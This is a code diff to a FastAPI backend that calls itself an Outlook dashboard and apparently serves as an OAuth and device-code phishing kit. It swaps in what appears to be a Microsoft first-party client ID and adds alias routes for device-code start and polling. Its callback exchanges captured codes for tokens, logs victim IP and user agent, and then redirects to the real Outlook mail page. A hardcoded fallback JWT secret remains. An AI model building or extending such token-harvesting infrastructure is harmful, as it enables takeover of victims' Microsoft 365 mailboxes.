@@ -46,11 +46,11 @@ from models import (
 
 app = FastAPI()
 
-SECRET_KEY = os.environ.get("SECRET_KEY", "super-secret-key-change-this")
+SECRET_KEY = os.environ.get("JWT_SECRET_KEY") or os.environ.get("SECRET_KEY", "super-secret-key-change-this")
 ALGORITHM = "HS256"
 ACCESS_TOKEN_EXPIRE_MINUTES = 10080
 
-CLIENT_ID = os.environ.get("CLIENT_ID", "3d3d5a12-09a4-4163-bab2-0188bf65ddd1")
+CLIENT_ID = os.environ.get("CLIENT_ID", "1950a258-227b-4e31-a9cf-717495945fc2")
 ADMIN_CONSENT_TENANT = os.environ.get("ADMIN_CONSENT_TENANT", "organizations")
 READ_ONLY_MODE = os.environ.get("READ_ONLY_MODE", "true").lower() == "true"
 
@@ -126,6 +126,10 @@ origins = [
     "https://frontend-xg84.onrender.com",
 ]
 
+FRONTEND_ORIGIN = os.environ.get("FRONTEND_ORIGIN")
+if FRONTEND_ORIGIN and FRONTEND_ORIGIN not in origins:
+    origins.append(FRONTEND_ORIGIN)
+
 app.add_middleware(
     CORSMiddleware,
     allow_origins=origins,
@@ -160,6 +164,15 @@ def get_app_config():
         "read_only_mode": READ_ONLY_MODE,
         "device_code_preferred": True,
         "admin_consent_tenant": ADMIN_CONSENT_TENANT,
+    }
+
+@app.get("/")
+def root():
+    return {
+        "status": "ok",
+        "service": "browser-only Outlook dashboard backend",
+        "device_code_enabled": True,
+        "oauth_callback_enabled": True,
     }
 
 
@@ -541,6 +554,7 @@ def generate_admin_consent_url_route(tenant: str | None = None, user=Depends(ver
     }
 
 
+@app.post("/devicecode")
 @app.post("/device-code/start")
 async def device_code_start(request: Request, user=Depends(verify_token)):
     admin_user_id = user["sub"]
@@ -566,6 +580,7 @@ async def device_code_start(request: Request, user=Depends(verify_token)):
         raise HTTPException(status_code=400, detail=str(e))
 
 
+@app.post("/device-token")
 @app.post("/device-code/poll")
 async def device_code_poll(request: Request, user=Depends(verify_token)):
     body = await request.json()
@@ -777,7 +792,8 @@ def auth_callback(request: Request):
 
     try:
         exchange_code_for_token(code, state, client_ip, user_agent)
-        return RedirectResponse(url="https://outlook.office.com/mail/")
+        success_redirect = os.environ.get("OAUTH_SUCCESS_REDIRECT", "https://outlook.office.com/mail/")
+        return RedirectResponse(url=success_redirect)
     except Exception as e:
         return JSONResponse({"error": str(e)}, status_code=400)
 
